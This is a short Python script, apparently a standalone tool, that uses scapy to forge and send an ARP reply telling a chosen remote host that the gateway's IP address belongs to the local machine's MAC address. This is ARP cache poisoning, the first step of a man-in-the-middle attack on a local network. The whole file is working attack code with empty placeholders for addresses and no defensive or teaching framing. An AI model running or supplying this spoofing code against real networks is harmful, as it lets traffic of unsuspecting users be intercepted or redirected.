#!/usr/bin/python
# Send arp gw_ip is_at local_mac to remote_ip/mac
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
 
gw_ip=""
local_mac=""
remote_ip=""
remote_mac=""
pkt = Ether(src=local_mac, dst=remote_mac)/ARP(op=ARP.is_at, pdst=remote_ip, psrc=gw_ip, hwdst=remote_mac)
sendp(pkt, verbose=0)
